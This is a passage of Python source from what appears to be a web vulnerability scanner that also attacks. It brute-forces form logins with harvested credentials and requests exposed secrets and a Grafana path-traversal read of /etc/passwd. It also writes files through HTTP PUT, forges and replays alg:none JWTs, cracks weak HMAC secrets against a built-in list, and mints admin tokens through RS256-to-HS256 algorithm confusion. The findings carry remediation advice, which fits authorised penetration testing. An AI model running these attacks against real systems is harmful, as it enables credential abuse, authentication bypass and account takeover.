    action = form.get("action") or page
    action = action if action.startswith("/") else "/" + action.lstrip("./")

    def _submit(u, p):
        data = dict(form.get("values") or {})
        data[userf], data[passf] = u, p
        return _fetch(ip, port, action, method="POST", body=urlencode(data),
                      auth={"Content-Type": "application/x-www-form-urlencoded"})

    bad = _submit("recce_zz_nouser", "recce_zz_nopass")     # wrong-cred baseline
    for u, p in creds[:8]:
        r = _submit(u, p)
        if not r:
            continue
        redirected = r[0] in (301, 302, 303) and (not bad or bad[0] not in (301, 302, 303))
        cleared = _looks_logged_out(bad) and not _looks_logged_out(r)
        if redirected or cleared:
            ck = _session_cookie(r[1])
            return ({"Cookie": ck} if ck else {"X-Recce-Auth": "1"}), (u, p)
    return None, None


def autologin(host: Host, creds: list, active: bool = True) -> dict | None:
    """Try to obtain an authenticated session on any of a host's web ports using the
    engagement's harvested credentials. Returns {auth, user, port} on success."""
    if not active or not creds:
        return None
    for p in host.open_ports:
        if not is_web(p):
            continue
        r = _fetch(host.ip, p, "/")
        a, used = _form_login(host.ip, p, r[2] if r else "", creds)
        if a is not None:
            return {"auth": a, "user": used[0], "port": p.portid}
    return None


# --- high-signal exposure paths (GET, confirmed only on positive content) -------
# (path, severity, script_id, title, cwes, remediation, confirm(status, body))
_PATHS = [
    (".git/HEAD", "high", "web-git", "Exposed Git repository (.git) - source/secret disclosure",
     ["CWE-538"], "Deny access to .git and remove it from the web root.",
     lambda s, b: s == 200 and b.strip().startswith("ref:")),
    (".git/config", "high", "web-gitconfig", "Exposed .git/config (remote URL - may embed credentials)",
     ["CWE-538"], "Deny access to .git and remove it from the web root.",
     lambda s, b: s == 200 and "[core]" in b),
    (".env", "high", "web-dotenv", "Exposed .env file (app secrets / DB credentials)",
     ["CWE-538", "CWE-215"], "Move .env outside the web root; deny access.",
     lambda s, b: s == 200 and re.search(r"APP_KEY|DB_(PASSWORD|HOST|USER)|SECRET|API_?KEY", b, re.I)),
    (".svn/entries", "medium", "web-svn", "Exposed SVN metadata (.svn)",
     ["CWE-538"], "Remove .svn from the web root.",
     lambda s, b: s == 200 and b.split("\n", 1)[0].strip().isdigit()),
    ("server-status", "medium", "web-serverstatus", "Apache mod_status exposed (/server-status)",
     ["CWE-200"], "Restrict <Location /server-status> to localhost/admins.",
     lambda s, b: s == 200 and "Apache Server Status" in b),
    ("phpinfo.php", "medium", "web-phpinfo", "phpinfo() page exposed",
     ["CWE-200"], "Remove phpinfo() pages from production.",
     lambda s, b: s == 200 and "phpinfo()" in b.lower()),
    ("info.php", "medium", "web-phpinfo", "phpinfo() page exposed",
     ["CWE-200"], "Remove phpinfo() pages from production.",
     lambda s, b: s == 200 and "phpinfo()" in b.lower()),
    ("web.config", "medium", "web-webconfig", "IIS web.config readable",
     ["CWE-538"], "Deny direct access to web.config.",
     lambda s, b: s == 200 and "<configuration" in b.lower()),
    ("swagger.json", "info", "web-swagger", "API schema exposed (Swagger/OpenAPI)",
     ["CWE-200"], "Restrict API schema exposure if not intended public.",
     lambda s, b: s == 200 and ('"swagger"' in b or '"openapi"' in b)),
    ("manager/html", "medium", "web-tomcat-manager", "Apache Tomcat Manager reachable",
     ["CWE-1188"], "Restrict/authenticate the Tomcat Manager app.",
     # A bare 200/401/403 matched EVERY auth-gated or default-deny server (nginx 403,
     # site-wide basic auth) as "Tomcat Manager". Require a Tomcat signature: its own
     # manager app (200) and its default 401/403 error pages are branded "Apache
     # Tomcat", so a generic 401/403 from something else no longer qualifies.
     lambda s, b: s in (200, 401, 403) and "tomcat" in b.lower()),
    ("wp-login.php", "info", "web-wordpress", "WordPress login page (WordPress in use)",
     ["CWE-200"], "Ensure WordPress + plugins are current; restrict wp-login/xmlrpc.",
     lambda s, b: s == 200 and ("user_login" in b or "wordpress" in b.lower())),
    ("robots.txt", "info", "web-robots", "robots.txt discloses paths",
     ["CWE-200"], "Review Disallow entries (they hint at sensitive paths).",
     lambda s, b: s == 200 and "disallow" in b.lower()),
    # --- high-value exposures --------------------------------------------------
    (".DS_Store", "low", "web-dsstore", "Exposed .DS_Store (directory structure disclosure)",
     ["CWE-548"], "Remove .DS_Store from the web root; deny dotfiles.",
     lambda s, b: s == 200 and "Bud1" in b[:16]),
    ("crossdomain.xml", "medium", "web-crossdomain",
     "Permissive crossdomain.xml (wildcard allow-access-from)",
     ["CWE-942"], "Remove the wildcard; restrict allow-access-from to trusted domains.",
     lambda s, b: s == 200 and "cross-domain-policy" in b
     and bool(re.search(r'allow-access-from[^>]*domain="\*"', b))),
    ("metrics", "medium", "web-metrics", "Prometheus /metrics endpoint exposed",
     ["CWE-200"], "Restrict /metrics to the scraper - it leaks internal metrics/paths.",
     lambda s, b: s == 200 and ("# HELP" in b or "# TYPE" in b)),
    (".htpasswd", "high", "web-htpasswd", "Exposed .htpasswd (password hashes)",
     ["CWE-538"], "Deny access to .ht* files in the web server config.",
     lambda s, b: s == 200 and bool(re.search(r":\$(apr1|2[aby]|1|5|6)\$|:\{SHA\}", b))),
    ("server-info", "medium", "web-serverinfo", "Apache mod_info exposed (/server-info)",
     ["CWE-200"], "Restrict <Location /server-info> to localhost/admins.",
     lambda s, b: s == 200 and "Apache Server Information" in b),
    (".aws/credentials", "high", "web-aws", "Exposed AWS credentials file",
     ["CWE-538"], "Remove cloud creds from the web root and rotate them.",
     lambda s, b: s == 200 and "aws_access_key_id" in b.lower()),
    ("wp-json/wp/v2/users", "low", "web-wpusers", "WordPress user enumeration via REST API",
     ["CWE-200"], "Restrict the users REST endpoint / disable REST user listing.",
     lambda s, b: s == 200 and '"slug"' in b and b.lstrip().startswith("[")),
    # --- niche application exposures (tier 1) ----------------------------------
    ("script", "critical", "web-jenkins-script",
     "Jenkins Script Console reachable unauthenticated (Groovy RCE)",
     ["CWE-284", "CWE-94"],
     "Enable Jenkins security + matrix auth; never expose /script anonymously.",
     lambda s, b: s == 200 and ("Script Console" in b or "Jenkins.instance" in b
                                or 'name="script"' in b)),
    ("admin/master/console/", "medium", "web-keycloak-console",
     "Keycloak admin console reachable",
     ["CWE-284"],
     "Restrict the admin console to trusted networks / behind a VPN.",
     lambda s, b: s == 200 and ("Keycloak Administration" in b or "kc-context" in b
                                or "authServerUrl" in b or "adminBaseUrl" in b)),
    ("public/plugins/alertlist/../../../../../../../../etc/passwd", "high",
     "web-grafana-lfi",
     "Grafana plugin path traversal - arbitrary file read (CVE-2021-43798)",
     ["CWE-22"],
     "Upgrade Grafana to >= 8.3.1; restrict the plugin routes.",
     lambda s, b: s == 200 and bool(re.search(r"root:.*:0:0:", b))),
    ("v1/sys/seal-status", "low", "web-vault-status",
     "HashiCorp Vault reachable (seal status / version readable)",
     ["CWE-200"],
     "Restrict the Vault API to trusted clients; keep audit + auth enforced.",
     lambda s, b: s == 200 and '"sealed"' in b and '"version"' in b),
    ("_cat/indices?format=json", "high", "web-elastic-open",
     "Elasticsearch readable without authentication (data exposure)",
     ["CWE-306", "CWE-284"],
     "Enable the security realm (authentication) and bind to a trusted interface.",
     lambda s, b: s == 200 and b.lstrip()[:1] == "["
     and ('"health"' in b or '"index"' in b)),
    ("api/status", "info", "web-kibana",
     "Kibana status endpoint exposed (version disclosure)",
     ["CWE-200"],
     "Restrict Kibana; keep it patched (the version maps to known CVEs).",
     lambda s, b: s == 200 and '"version"' in b and "kibana" in b.lower()),
]

_DANGEROUS_METHODS = {"PUT", "DELETE", "TRACE", "CONNECT", "PATCH"}

# Cookie names that indicate a session / auth / anti-CSRF token (hardening matters most).
_SESSION_COOKIE = re.compile(r"sess|sid|auth|token|jwt|remember|login|sso|csrf", re.I)


def _security_headers(ip: str, port: Port, headers: dict) -> list[Vuln]:
    """Consolidated audit of the root response's security headers. One finding listing
    every missing header; severity rises when a high-impact one (CSP / clickjacking /
    HSTS-on-TLS) is absent."""
    if not headers:
        return []
    missing: list[str] = []
    high = False
    csp = headers.get("content-security-policy", "")
    if not csp:
        missing.append("Content-Security-Policy")
        high = True
    if not headers.get("x-frame-options") and "frame-ancestors" not in csp.lower():
        missing.append("X-Frame-Options / CSP frame-ancestors (clickjacking)")
        high = True
    if "nosniff" not in headers.get("x-content-type-options", "").lower():
        missing.append("X-Content-Type-Options: nosniff")
    if not headers.get("referrer-policy"):
        missing.append("Referrer-Policy")
    if probes._is_tls(port) and not headers.get("strict-transport-security"):
        missing.append("Strict-Transport-Security (HSTS)")
        high = True
    if not headers.get("permissions-policy"):
        missing.append("Permissions-Policy")
    if not missing:
        return []
    return [_mk(ip, port, "web-security-headers", "medium" if high else "low",
                "Missing security response headers", ["CWE-693"],
                "The root response omits: " + "; ".join(missing) + ".",
                "Set the missing headers: Content-Security-Policy, X-Frame-Options (or CSP "
                "frame-ancestors), Strict-Transport-Security on TLS, X-Content-Type-Options: "
                "nosniff, Referrer-Policy, Permissions-Policy.")]


# Subdomain-takeover fingerprints: a dangling CNAME to a third-party service whose
# resource is unclaimed serves one of these distinctive error pages -> claimable.
_TAKEOVER = [
    ("AWS S3", re.compile(r"NoSuchBucket|The specified bucket does not exist")),
    ("GitHub Pages", re.compile(r"There isn't a GitHub Pages site here|"
                                r"For root URLs \(like http://example\.com/\)")),
    ("Heroku", re.compile(r"No such app|herokucdn\.com/error-pages/no-such-app")),
    ("Fastly", re.compile(r"Fastly error: unknown domain")),
    ("Shopify", re.compile(r"Sorry, this shop is currently unavailable")),
    ("Tumblr", re.compile(r"Whatever you were looking for doesn't currently exist at "
                          r"this address")),
    ("Bitbucket", re.compile(r"Repository not found")),
    ("Ghost", re.compile(r"The thing you were looking for is no longer here")),
    ("Surge.sh", re.compile(r"project not found")),
    ("Pantheon", re.compile(r"The gods are wise, but do not know of the site which you seek")),
    ("Azure", re.compile(r"404 Web Site not found|azurewebsites")),
    ("Netlify", re.compile(r"Not Found - Request ID")),
    ("Zendesk", re.compile(r"Help Center Closed")),
    ("Read the Docs", re.compile(r"unknown to Read the Docs")),
    ("Cargo", re.compile(r"<title>404 &mdash; File not found</title>.*cargo", re.S)),
]


def _takeover_service(body: str) -> str:
    if not body:
        return ""
    head = body[:8000]
    for svc, rx in _TAKEOVER:
        if rx.search(head):
            return svc
    return ""


def _takeover_finding(ip: str, port: Port, base: str, host: str, service: str) -> Vuln:
    return _mk(ip, port, "web-takeover", "high",
               f"Potential subdomain takeover ({service})", ["CWE-16"],
               f"{host or base} served the {service} 'unclaimed resource' error page - the "
               f"DNS record points at {service} but the resource isn't claimed, so an "
               "attacker can register it and serve arbitrary content on this domain "
               "(phishing, cookie theft, OAuth-redirect abuse).",
               f"Remove the dangling DNS record, or (re)claim the {service} resource it "
               "points to.", confidence="confirmed")


def _csp_findings(ip: str, port: Port, headers: dict) -> list[Vuln]:
    """Analyse a PRESENT Content-Security-Policy for bypasses (a missing CSP is handled
    by the security-headers audit). A weak CSP doesn't stop the XSS it's meant to."""
    csp = headers.get("content-security-policy", "")
    if not csp:
        return []
    low = csp.lower()
    m = re.search(r"script-src\s+([^;]*)", low) or re.search(r"default-src\s+([^;]*)", low)
    script_src = m.group(1) if m else ""
    weak: list[str] = []
    high = False
    if "'unsafe-inline'" in script_src or ("'unsafe-inline'" in low and not m):
        weak.append("'unsafe-inline' in script-src (inline-script XSS is not blocked)")
        high = True
    if "'unsafe-eval'" in low:
        weak.append("'unsafe-eval' (eval()-based script execution allowed)")
    if re.search(r"(^|\s)\*(\s|$)", script_src) or "http:" in script_src \
            or "data:" in script_src or script_src.strip() in ("https:", "*"):
        weak.append("a wildcard / scheme source in script-src (any-origin script load)")
        high = True
    if "object-src" not in low:
        weak.append("no object-src 'none' (plugin/embed XSS vector)")
    if "base-uri" not in low:
        weak.append("no base-uri (a <base> tag can hijack relative script URLs)")
    if not weak:
        return []
    return [_mk(ip, port, "web-csp", "medium" if high else "low",
                "Weak Content-Security-Policy (bypassable)", ["CWE-693"],
                "The CSP is present but weak: " + "; ".join(weak) + ".",
                "Drop 'unsafe-inline'/'unsafe-eval' (use nonces/hashes), remove wildcard/"
                "scheme sources, and set object-src 'none' + base-uri 'self'.")]


def _cookie_findings(ip: str, port: Port, set_cookie_blob: str) -> list[Vuln]:
    """Per-cookie hygiene from the Set-Cookie header(s): HttpOnly, Secure, SameSite,
    __Host-/__Secure- prefix, cleartext-session transport, and over-broad Domain scope.
    Deduped by (cookie name, issue) so many cookies don't spam identical findings."""
    out: list[Vuln] = []
    if not set_cookie_blob:
        return out
    tls = probes._is_tls(port)
    seen: set = set()

    for line in set_cookie_blob.split("\n"):
        line = line.strip()
        if not line or "=" not in line:
            continue
        name = line.split("=", 1)[0].strip()
        low = line.lower()
        session = bool(_SESSION_COOKIE.search(name))

        def add(sev, title, cwes, fix):
            if (name, title) in seen:
                return
            seen.add((name, title))
            out.append(_mk(ip, port, "web-cookie", sev, f"{title}: {name}", cwes,
                           f"Set-Cookie: {line[:140]}", fix))

        if "httponly" not in low:
            add("low", "Cookie without HttpOnly", ["CWE-1004"],
                "Set HttpOnly so client-side JavaScript cannot read the cookie.")
        if tls and "secure" not in low:
            add("low", "Cookie without Secure (served over HTTPS)", ["CWE-614"],
                "Set the Secure flag so the cookie is only sent over HTTPS.")
        if "samesite" not in low:
            add("low", "Cookie without SameSite (CSRF / cross-site surface)",
                ["CWE-1275"], "Set SameSite=Lax (or Strict) to limit cross-site sending.")
        elif "samesite=none" in low and "secure" not in low:
            add("medium", "Cookie SameSite=None without Secure", ["CWE-1275"],
                "SameSite=None requires the Secure attribute; browsers reject it otherwise.")
        if session and not tls:
            add("medium", "Session cookie set over cleartext HTTP (token exposed on the wire)",
                ["CWE-319"], "Serve authentication over HTTPS + HSTS.")
        if session and not (name.startswith("__Host-") or name.startswith("__Secure-")):
            add("info", "Session cookie without __Host-/__Secure- prefix", ["CWE-1275"],
                "Prefix session cookies with __Host- to pin host + Secure + Path=/.")
        if re.search(r"domain=(\.[^;]+)", low):
            add("low", "Cookie scoped to a broad parent Domain", ["CWE-1275"],
                "Drop the leading-dot Domain; scope cookies to the exact host.")
    return out


def _prove_put(ip: str, port: Port, auth: dict | None):
    """Non-destructively prove HTTP PUT write: upload a unique marker file, read it
    back, then DELETE it. Returns (True, evidence) if it round-trips, (False, note) if
    PUT is advertised but rejected/unreadable, or None if the request failed."""
    name = "recce_put_probe.txt"
    marker = "recce-put-write-proof"
    put = _fetch(ip, port, "/" + name, method="PUT", body=marker, auth=auth)
    if not put:
        return None
    if put[0] not in (200, 201, 204):
        return False, f"PUT /{name} returned HTTP {put[0]} (advertised but not accepted)."
    got = _fetch(ip, port, "/" + name, method="GET", auth=auth)
    round_trips = bool(got and got[0] == 200 and marker in (got[2] or ""))
    _fetch(ip, port, "/" + name, method="DELETE", auth=auth)         # best-effort cleanup
    if round_trips:
        return True, (f"PUT /{name} -> HTTP {put[0]}; GET /{name} returned the uploaded "
                      f"marker '{marker}' -> arbitrary file write CONFIRMED "
                      "(probe file removed via DELETE).")
    return False, f"PUT /{name} returned {put[0]} but the file was not readable back."


# --- JWT weakness detection ------------------------------------------------------
# Passive: read the token from the response and flag the algorithm. Active: forge an
# alg:none variant (same claims + a harmless marker) and REPLAY it against the same
# path, comparing the response to the authenticated and anonymous baselines - a match
# to the authenticated view proves the server accepts unsigned, forgeable tokens.
_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]*")
# name=eyJ... inside a Set-Cookie so we can replay the token in its real cookie.
_JWT_COOKIE_RE = re.compile(
    r"([A-Za-z0-9_.\-]+)=(eyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]*)")


def _b64url(seg: str):
    try:
        return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))
    except Exception:  # noqa: BLE001
        return None


def _b64url_enc(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _jwt_alg(token: str):
    raw = _b64url(token.split(".", 1)[0])
    if not raw:
        return None
    try:
        return str(json.loads(raw).get("alg", "")).lower()
    except Exception:  # noqa: BLE001
        return None


def _jwt_candidates(headers: dict, body: str):
    """Every JWT in the response, tagged with where it lives so we can replay it:
    ('cookie', name, tok) / ('authorization', None, tok) / ('body', None, tok)."""
    out, seen = [], set()
    for m in _JWT_COOKIE_RE.finditer(headers.get("set-cookie", "")):
        name, tok = m.group(1), m.group(2)
        if tok not in seen:
            seen.add(tok)
            out.append(("cookie", name, tok))
    for tok in _JWT_RE.findall(headers.get("authorization", "")):
        if tok not in seen:
            seen.add(tok)
            out.append(("authorization", None, tok))
    for tok in _JWT_RE.findall(body):
        if tok not in seen:
            seen.add(tok)
            out.append(("body", None, tok))
    return out


def _forge_none(token: str):
    """alg:none forgery of `token`: keep the original claims, add a harmless marker so
    that a server ACCEPTING it proves it never checked the signature (we changed the
    payload). Returns the forged compact JWT (empty signature) or None."""
    parts = token.split(".")
    if len(parts) < 2:
        return None
    payraw = _b64url(parts[1])
    if payraw is None:
        return None
    try:
        claims = json.loads(payraw)
    except Exception:  # noqa: BLE001
        return None
    if not isinstance(claims, dict):
        return None
    claims = dict(claims)
    claims["recce_probe"] = 1        # innocuous, non-authorization marker
    head = _b64url_enc(b'{"alg":"none","typ":"JWT"}')
    pay = _b64url_enc(json.dumps(claims, separators=(",", ":")).encode())
    return f"{head}.{pay}."


def _jwt_replay(ip: str, port: Port, path: str, loc: str, cookie_name, token):
    """Fetch `path` presenting `token` in the location it was observed in. token=None
    fetches anonymously (the logged-out baseline)."""
    if token is None:
        return _fetch(ip, port, path)
    if loc == "cookie" and cookie_name:
        return _fetch(ip, port, path, auth={"Cookie": f"{cookie_name}={token}"})
    return _fetch(ip, port, path, auth={"Authorization": f"Bearer {token}"})


def _resp_same(a, b) -> bool:
    """Two HTTP responses look like the same authorization outcome: same status and a
    body length within a small tolerance (page-to-page jitter, not a login redirect)."""
    if a is None or b is None:
        return False
    if a[0] != b[0]:
        return False
    la, lb = len(a[2]), len(b[2])
    return abs(la - lb) <= max(64, int(0.10 * max(la, lb, 1)))


def _prove_jwt_none(ip: str, port: Port, path: str, loc: str, cookie_name, token: str):
    """Actively prove the server accepts a forged alg:none token. Returns
    (verdict, evidence) where verdict is confirmed/rejected/inconclusive, or None if
    the proof could not run."""
    forged = _forge_none(token)
    if not forged:
        return None
    authed = _jwt_replay(ip, port, path, loc, cookie_name, token)
    anon = _jwt_replay(ip, port, path, loc, cookie_name, None)
    frg = _jwt_replay(ip, port, path, loc, cookie_name, forged)
    if not (authed and anon and frg):
        return None
    where = f"cookie {cookie_name}" if loc == "cookie" else "Authorization: Bearer"
    lens = (f"authed=HTTP {authed[0]}/{len(authed[2])}B  anon=HTTP {anon[0]}/{len(anon[2])}B  "
            f"forged=HTTP {frg[0]}/{len(frg[2])}B")
    if _resp_same(authed, anon):
        return ("inconclusive",
                f"GET {path} returned the same response with the real token, with no token, "
                f"and with the forged alg:none token ({lens}) - the endpoint isn't gated by "
                f"this token, so acceptance can't be proven here. Replay against a "
                f"token-gated path with jwt_tool -X a.")
    if _resp_same(frg, authed):
        return ("confirmed",
                f"Forged an unsigned token (header alg:none, original claims + a marker) and "
                f"replayed it via {where} against {path}. The server returned the same "
                f"authenticated response as the real token, and a different one with no token "
                f"({lens}) - the signature is not verified, so tokens are forgeable with any "
                f"claims (privilege escalation, account takeover).")
    if _resp_same(frg, anon):
        return ("rejected",
                f"Forged alg:none token replayed via {where} against {path} was treated like "
                f"no token at all ({lens}) - the server rejects unsigned tokens on this path.")
    return ("inconclusive",
            f"Forged alg:none token produced a distinct response from both the authenticated "
            f"and anonymous baselines ({lens}); couldn't classify. Confirm with jwt_tool -X a.")


# Common HMAC secrets to try against an HS256/384/512 JWT (offline, instant). The
# short list catches the overwhelmingly common "weak/default secret" case; a real
# engagement extends it with a wordlist (jwt_tool / hashcat -m 16500).
_JWT_SECRETS = [
    "secret", "secretkey", "secret_key", "jwt_secret", "jwtsecret", "jwt", "key",
    "password", "changeme", "change_me", "admin", "test", "123456", "1234567890",
    "qwerty", "supersecret", "super_secret", "mysecret", "my_secret", "s3cr3t",
    "secret123", "password123", "default", "your-256-bit-secret", "your-secret-key",
    "your_jwt_secret", "topsecret", "letmein", "private", "token", "auth", "hmac",
    "signingkey", "signing_key", "app_secret", "appsecret", "sekret", "secretsecret",
    "access_token_secret", "refresh_token_secret", "0000", "null", "undefined",
]
_HS_HASH = {"hs256": hashlib.sha256, "hs384": hashlib.sha384, "hs512": hashlib.sha512}


def _jwt_crack_hs(token: str, extra_secrets=None) -> str | None:
    """Offline HMAC brute of an HS* JWT against the built-in list (+ any extra secrets,
    e.g. engagement-harvested). Returns the signing secret if found, else None. The
    HMAC check is exact, so a hit IS the secret - no false positive."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    h = _HS_HASH.get(_jwt_alg(token) or "")
    if h is None:
        return None
    sig = _b64url(parts[2])
    if not sig:
        return None
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    for secret in list(_JWT_SECRETS) + list(extra_secrets or []):
        if not secret:
            continue
        if hmac.compare_digest(hmac.new(secret.encode(), signing_input, h).digest(), sig):
            return secret
    return None


def _forge_hs(token: str, secret: str, extra_claims: dict) -> str | None:
    """Forge a token from `token`'s claims (+ extra_claims) signed with `secret` - a
    ready proof that the recovered secret grants arbitrary tokens."""
    parts = token.split(".")
    alg = _jwt_alg(token) or "hs256"
    h = _HS_HASH.get(alg)
    payraw = _b64url(parts[1]) if len(parts) > 1 else None
    if h is None or payraw is None:
        return None
    try:
        claims = json.loads(payraw)
    except (ValueError, TypeError):
        return None
    if not isinstance(claims, dict):
        return None
    claims = {**claims, **extra_claims}
    head = _b64url_enc(json.dumps({"alg": alg.upper(), "typ": "JWT"},
                                  separators=(",", ":")).encode())
    pay = _b64url_enc(json.dumps(claims, separators=(",", ":")).encode())
    sig = _b64url_enc(hmac.new(secret.encode(), f"{head}.{pay}".encode(), h).digest())
    return f"{head}.{pay}.{sig}"


# --- RS256 -> HS256 algorithm confusion (sign with the PUBLIC key as the HMAC secret) ---
_JWKS_PATHS = ["/.well-known/jwks.json", "/jwks.json", "/jwks", "/oauth2/jwks",
               "/oauth/jwks", "/api/jwks", "/.well-known/openid-configuration"]


def _der_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def _der(tag: int, content: bytes) -> bytes:
    return bytes([tag]) + _der_len(len(content)) + content


def _der_uint(x: int) -> bytes:
    b = x.to_bytes((x.bit_length() + 7) // 8 or 1, "big")
    if b[0] & 0x80:
        b = b"\x00" + b                       # keep it a positive INTEGER
    return _der(0x02, b)


def _rsa_pubkey_pem(n: int, e: int) -> str:
    """Reconstruct the SubjectPublicKeyInfo PEM for an RSA public key from (n, e) -
    the exact bytes a JWT library uses as the HMAC key in an alg-confusion attack."""
    rsa = _der(0x30, _der_uint(n) + _der_uint(e))                 # RSAPublicKey (PKCS#1)
    alg = _der(0x30, _der(0x06, bytes.fromhex("2a864886f70d010101")) + _der(0x05, b""))
    spki = _der(0x30, alg + _der(0x03, b"\x00" + rsa))            # SubjectPublicKeyInfo
    b64 = base64.b64encode(spki).decode()
    lines = "\n".join(b64[i:i + 64] for i in range(0, len(b64), 64))
    return f"-----BEGIN PUBLIC KEY-----\n{lines}\n-----END PUBLIC KEY-----\n"


def _b64url_uint(s: str) -> int:
    return int.from_bytes(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)), "big")


def _fetch_jwks_pubkey(ip: str, port: Port, auth) -> str | None:
    """Find the server's RSA public key (JWKS / OIDC discovery) and return it as a PEM."""
    for path in _JWKS_PATHS:
        r = _fetch(ip, port, path, auth=auth)
        if not r or r[0] != 200 or not r[2]:
            continue
        try:
            d = json.loads(r[2])
        except (ValueError, TypeError):
            continue
        if isinstance(d, dict) and d.get("jwks_uri"):             # OIDC discovery -> jwks
            rr = _fetch(ip, port, urlparse(d["jwks_uri"]).path or "/", auth=auth)
            if rr and rr[0] == 200:
                try:
                    d = json.loads(rr[2])
                except (ValueError, TypeError):
                    continue
        keys = d.get("keys") if isinstance(d, dict) else None
        if not isinstance(keys, list):
            continue
        for k in keys:
            if isinstance(k, dict) and k.get("kty") == "RSA" and k.get("n") and k.get("e"):
                try:
                    return _rsa_pubkey_pem(_b64url_uint(k["n"]), _b64url_uint(k["e"]))
                except (ValueError, TypeError):
                    continue
    return None


def _forge_alg_confusion(token: str, pem: str) -> str | None:
    """Forge an HS256 token (escalated claims) signed with the RSA public-key PEM as the
    HMAC secret - what a server that accepts HS256 with the same key would validate."""
    parts = token.split(".")
    payraw = _b64url(parts[1]) if len(parts) > 1 else None
    if payraw is None:
        return None
    try:
        claims = json.loads(payraw)
    except (ValueError, TypeError):
        return None
    if not isinstance(claims, dict):
        return None
    claims = {**claims, "admin": True, "role": "admin", "recce": 1}
    head = _b64url_enc(json.dumps({"alg": "HS256", "typ": "JWT"},
                                  separators=(",", ":")).encode())
    pay = _b64url_enc(json.dumps(claims, separators=(",", ":")).encode())
    sig = _b64url_enc(hmac.new(pem.encode(), f"{head}.{pay}".encode(),
                               hashlib.sha256).digest())
    return f"{head}.{pay}.{sig}"


def _replay_forged(ip: str, port: Port, path: str, loc: str, cookie_name, real, forged):
    """Replay a forged token vs the real token vs no token. Returns confirmed / rejected /
    inconclusive, or None if the probes failed."""
    authed = _jwt_replay(ip, port, path, loc, cookie_name, real)
    anon = _jwt_replay(ip, port, path, loc, cookie_name, None)
    frg = _jwt_replay(ip, port, path, loc, cookie_name, forged)
    if not (authed and anon and frg):
        return None
    if _resp_same(authed, anon):
        return "inconclusive"
    if _resp_same(frg, authed):
        return "confirmed"
    if _resp_same(frg, anon):
        return "rejected"
    return "inconclusive"


def _scan_jwts(ip: str, port: Port, headers: dict, body: str,
               active: bool = False) -> list[Vuln]:
    out: list[Vuln] = []
    seen_alg: set[str] = set()
    for loc, cookie_name, tok in _jwt_candidates(headers, body):
        alg = _jwt_alg(tok)
        if alg is None:
            continue
        red = f"{tok[:12]}…{tok[-6:]}"
        if alg == "none":
            proof = _prove_jwt_none(ip, port, "/", loc, cookie_name, tok) if active else None
            if proof and proof[0] == "confirmed":
                out.append(_mk(ip, port, "web-jwt", "high",
                               "JWT alg:none accepted - forged unsigned token (proven)",
                               ["CWE-347"], proof[1],
                               "Reject 'none'; pin the expected algorithm server-side.",
                               confidence="confirmed"))
                continue
            if proof and proof[0] == "rejected":
                out.append(_mk(ip, port, "web-jwt", "info",
                               "JWT issued with alg:none (but forged token rejected)",
                               ["CWE-347"], proof[1],
                               "Stop issuing alg:none tokens; pin the algorithm.",
                               confidence="potential"))
                continue
            note = (f"A JWT with header alg=none was observed ({red}). If the server verifies "
                    "it, tokens can be forged with any claims.")
            if proof:
                note += "  " + proof[1]
            out.append(_mk(ip, port, "web-jwt", "high",
                           "JWT accepts 'alg:none' (unsigned - forgeable)", ["CWE-347"],
                           note, "Reject 'none'; pin the expected algorithm server-side.",
                           confidence="potential"))
            continue
        if alg in seen_alg:      # de-dupe the algorithmic notes (one per alg family)
            continue
        seen_alg.add(alg)
        if alg.startswith("hs"):
            cracked = _jwt_crack_hs(tok)
            if cracked:
                forged = _forge_hs(tok, cracked, {"admin": True, "role": "admin",
                                                  "recce": 1})
                pocline = (f"  Forged admin token (verify with the same secret): {forged}"
                           if forged else "")
                out.append(_mk(
                    ip, port, "web-jwt", "critical",
                    f"JWT HMAC secret cracked ('{cracked}') - forge arbitrary tokens",
                    ["CWE-347", "CWE-1391"],
                    f"The {alg.upper()} JWT ({red}) is signed with the weak secret "
                    f"'{cracked}', recovered by offline HMAC brute force. With the secret "
                    "an attacker forges ANY token - set admin/other-user claims for a "
                    "complete authentication bypass / privilege escalation." + pocline,
                    "Use a long random secret (>=32 random bytes) or an asymmetric "
                    "algorithm (RS256); rotate the compromised secret and invalidate "
                    "issued tokens.", confidence="confirmed"))
            else:
                out.append(_mk(ip, port, "web-jwt", "low",
                               f"JWT uses symmetric {alg.upper()} (offline-crackable secret)",
                               ["CWE-347"],
                               f"JWT header alg={alg.upper()} ({red}). The built-in weak-secret "
                               "list didn't crack it; try a full wordlist (hashcat -m 16500 / "
                               "jwt_tool). A weak HMAC secret lets you forge tokens.",
                               "Use a long random secret (or RS256); rotate it.",
                               confidence="potential"))
        elif alg.startswith(("rs", "es", "ps")):
            pem = _fetch_jwks_pubkey(ip, port, None) if alg.startswith("rs") else None
            forged = _forge_alg_confusion(tok, pem) if pem else None
            if forged:
                verdict = None
                if active:
                    verdict = _replay_forged(ip, port, "/", loc, cookie_name, tok, forged)
                if verdict == "confirmed":
                    out.append(_mk(ip, port, "web-jwt", "critical",
                                   "JWT RS256->HS256 algorithm confusion (forged token accepted)",
                                   ["CWE-347"],
                                   f"The {alg.upper()} JWT ({red}) - recce recovered the RSA "
                                   "public key from the server's JWKS, forged an HS256 token "
                                   "signed with that public key, and the server ACCEPTED it "
                                   "(same authenticated response as the real token). Tokens "
                                   f"are forgeable with any claims.\n\nForged admin token: {forged}",
                                   "Pin the expected algorithm server-side; never accept HS* "
                                   "when the key is an RSA public key.", confidence="confirmed"))
                elif verdict != "rejected":
                    out.append(_mk(ip, port, "web-jwt", "high",
                                   "JWT RS256->HS256 algorithm-confusion (forged token minted)",
                                   ["CWE-347"],
                                   f"The {alg.upper()} JWT ({red}) - recce recovered the RSA "
                                   "public key from the server's JWKS and minted an HS256 token "
                                   "signed with it. If the server verifies HS* with the same "
                                   "key it accepts this (auth bypass / privilege escalation); "
                                   f"replay it on a token-gated path to confirm.\n\nForged token: {forged}",
                                   "Pin the algorithm server-side; never accept HS* with the "
                                   "RSA public key.", confidence="potential"))
            else:
